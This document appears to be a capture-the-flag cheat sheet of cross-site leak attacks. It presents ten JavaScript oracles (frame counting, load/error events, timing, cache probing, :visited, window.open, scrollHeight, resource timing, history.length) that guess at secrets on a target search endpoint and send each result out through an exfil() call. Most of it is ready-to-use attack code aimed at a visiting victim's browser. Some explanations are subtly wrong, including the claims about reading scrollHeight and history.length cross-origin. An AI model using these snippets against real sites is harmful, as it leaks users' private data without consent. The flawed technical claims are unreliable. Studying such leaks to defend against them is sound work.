# Classic deep — the client-side measures, exhaustively

Every side-channel your JS can measure when the bot visits YOUR URL.

---

## 1. The frames.length oracle — a count

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>{
  // frames.length is readable cross-origin — a count oracle
  exfil(g+'='+f.contentWindow.frames.length);
};
document.body.appendChild(f);
```

```text
a search that renders one <iframe> per matching result — 'how many
frames' = 'how many results' = a count oracle. a hit renders N
frames; a miss renders 0. a prefix search leaks a secret one char
at a time.
```

## 2. The onload/onerror oracle — a hit/miss

```js
// an <img> — the events fire on load success vs failure
var i=new Image();
i.onload=()=>exfil(g+'=H'); i.onerror=()=>exfil(g+'=M');
i.src='https://t/api/search?q='+encodeURIComponent(g);
```

```text
a search that 200s on a hit, 404s on a miss — the load event is the
bit. the same events fire on <script>/<link>/<iframe>/<video>/<audio>
/<object> — any subresource load carries the oracle.
```

## 3. The timing oracle — a slow-vs-fast response

```js
var t0=performance.now();
fetch('https://t/api/search?q='+encodeURIComponent(g),{mode:'no-cors'})
 .finally(()=>exfil(g+'='+Math.round(performance.now()-t0)));
```

```text
a search whose response time differs with the result — a slow query
vs a fast rejection. the timing threshold is the bit. noise: a
server's jitter — average over N samples.
```

## 4. The cache-probe oracle — a cached-vs-uncached timing

```js
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+encodeURIComponent(g)+'?cb='+Math.random();
```

```text
a resource the victim's browser cached — a second load is faster —
'was it cached' = 'was the URL visited'. a history/cache oracle.
```

## 5. The :visited oracle — a history read

```js
var a=document.createElement('a');
a.href='https://t/search?q='+encodeURIComponent(g);
a.id='v'; document.body.appendChild(a);
// a :visited style on #v differs from an unvisited one — a history read
```

```text
a link to a URL the victim visited styles :visited differently —
a 404 URL never enters history. 'is it styled visited' = 'was it
visited'. modern browsers partition :visited — the read-back is a
rendering side-channel (a repaint cost), not a computed-style query.
```

## 6. The window.open oracle — a navigation/redirect check

```js
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);
```

```text
did the navigation happen — a redirect check. a page that redirects
on a hit vs stays on a miss — the window's state is the bit.
```

## 7. The scrollHeight oracle — a content-size side-channel

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
document.body.appendChild(f);
```

```text
the page's content height differs with the result count — a
content-length leak. the iframe's scrollHeight is readable on a
same-origin or a same-document case.
```

## 8. The resource-timing oracle — a load-duration read

```js
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

```text
the PerformanceResourceTiming API records a subresource's load
duration — a 'was it loaded' + 'how long' read. a cached resource
loads faster — a cache oracle.
```

## 9. The DOM-timing oracle — a render-time side-channel

```js
// measure how long the target's content takes to render
var t0=performance.now();
// ... trigger a render that depends on the result ...
exfil('render='+Math.round(performance.now()-t0));
```

```text
a render whose cost differs with the content — a DOM-timing oracle.
```

## 10. The history-length oracle — a window.history leak

```js
exfil('history='+window.history.length);
```

```text
window.history.length is readable cross-origin — 'how many entries'
= 'how many navigations happened' — a count oracle.
```

## The per-oracle channel-bandwidth

```text
frames.length        — log2(N) bits — a count
onload/onerror       — 1 bit — a hit/miss
timing               — ~1 bit — a slow/fast threshold
cache-probe          — 1 bit — a cached/uncached
:visited             — 1 bit — a visited/unvisited
window.open          — 1 bit — a navigated/not
scrollHeight         — log2(N) bits — a size
resource-timing      — ~1 bit — a loaded/not + a duration
history.length       — log2(N) bits — a count
```

## The control-pair pattern — always

```js
// an always-true control — a URL that always hits
var i=new Image(); i.onload=()=>exfil('YES'); i.src='https://t/hit';
// a never-true control — a URL that always misses
var i2=new Image(); i2.onload=()=>exfil('NO'); i2.src='https://t/miss';
// YES hits + NO doesn't → the channel works
```
